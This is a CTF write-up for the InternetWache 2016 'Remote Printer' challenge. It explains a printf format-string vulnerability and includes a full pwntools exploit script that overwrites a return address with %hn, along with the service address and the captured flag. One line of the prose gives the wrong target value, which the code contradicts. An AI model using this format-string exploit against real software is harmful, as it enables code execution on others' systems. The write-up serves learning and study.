+++
author = "kbeckmann"
categories = [ "writeups" ]
date = "2016-02-21T00:36:12+01:00"
description = ""
title = "InternetWache 2016 Remote Printer (Exploit 80) Writeup"

+++

# Problem
> Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.

(exp80, solved by 125)

Attachment: exp80.zip

Service: 188.166.133.53:12377

# Solution

This one was a bit harder. We are provided with a binary that listens on a port for incoming connections. When it gets a connection it reads an ip address and a port from the socket and connects to it. From the new socket, it reads the received bytes into the stack and prints it using printf(buf). Big bug here.

The buffer has the correct size but it's printed using printf(buf) which is obviously wrong.

Solution is to do a classic printf exploit which can be quite hard if you've never done it before.

There is also an extra function that reads and prints the flag, let's call it `printflag`.

Our goal is to change the return address to `printflag`.

We start off by printing some stack values using `%p`. The pointers on the stack are constant even when running it multiple times, `0xffffbcec`. Good for us, no ASLR. We can use hard coded pointers/offsets into the stack.

Now we need to find where the return address is stored since we want to overwrite it. We can do this by using math or guessing/leaking data.

`printf` has a nice feature which lets you access the stack at a specific position. `printf("%3$d", 1, 2, 3);` will print `3`. Abusing this, we can print way further down the stack.

I started out with an educated guess:

~~~python
payload = ' '.join(('%' + str(i) + '$p') for i in range(2000, 2100))
~~~

This produces a format string that will print the contents of the stack at 2000*4 until 2100*4 bytes away from our current location.

Now we search the output and look for the return address. We know it is `0x08048776` because that's the location of the instruction after `call start_server` where we should return normally.

I found it at the 63rd print, which means the index is 2063. Using this we can calculate the address of the return address to `0xffffdd0c`. This is where we want to change bytes.

Now we just need to overwrite this value `<main+0xAB> @ 0x08048776` with `<printflag> @ 0x08048867`.


# Arbitrary write with printf

So how do we change bytes with printf? This is a fun challenge if you haven't done so before. There is an operation `%n` that will write the number of bytes printed to the memory where the current argument is pointing to.

It will write it as a 32 bit value which will overwrite the whole pointer, so we don't want that. By using `%hn` we only write a *half int* which is 16 bits. It will preserve the 16 highest bits of the value and overwrite the lowest 16 bits.

What about the value then? We can control the value that is written (number of bytes printed) by adding padding to a dummy print.

Since we are overwriting `0x08048776` with `0x08048867`, we only need to write `0x8776` as a 16 bit value. `printf` supports padding of basically any size! So we start off by printing a char with exactly 0x8776 bytes of padding. `%34919c` does the trick. Now we have printed 0x8776 characters, and this is the value that `%hn` will write.

We control the address where we want to write the value to by putting it into the buffer and refering to it. This part can be tricky and in this instance the offset was `11`. `%11$hn` will write the number of printed characters to the address that we put in our input string. We need to be careful and pad the input so the address appears at the correct location.

# Full exploit

~~~python
from pwn import *
#context.log_level = 0

'''
Want to change return address to 0x08048867 (printflag function)
It is normally pointing to main+0xAB == 0x08048776
0x08048776 =>
0x08048867
LSB = 0x8867
'''

binary = './RemotePrinter'
context(os = 'linux', arch = 'x86')
elf = ELF(binary)

HOST='188.166.133.53'
PORT=12377
PWNHOST='<your ip>'
PWNPORT=1024

# local
#PWNHOST='127.0.0.1'
#PWNPORT=1024


l = listen(bindaddr='*', port=PWNPORT)
if PWNHOST == '127.0.0.1':
    r = process(binary)
else:
    r = remote(HOST, PORT)
    r.sendline(PWNHOST)
    r.sendline(str(PWNPORT))

#gdb.attach(r)

c = l.wait_for_connection()

# got from leaking once
stack = 0xffffbcec # Pointer to the input string on the stack

payload = flat(
    flat(
        "%",            # Set number of printed bytes to
        str(0x8867),    # 16 LSB of the address to printflag
        "c%",
        str(11),        # Address is located at offset 11
        "$hn"           # "h" means half = 16 bits
        ).ljust(16),    # pad it so we can find the address below
    0xffffdd0c,         # This is accessed with $11%n
    "\n"
)

c.sendline(payload)

r.recvuntil('\n\n')
print r.recvuntil('}')

~~~


YAY, FLAG: **IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}**


# References

There's a [very well written paper](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf) from 2001 that explains everything you ever need to know about this.
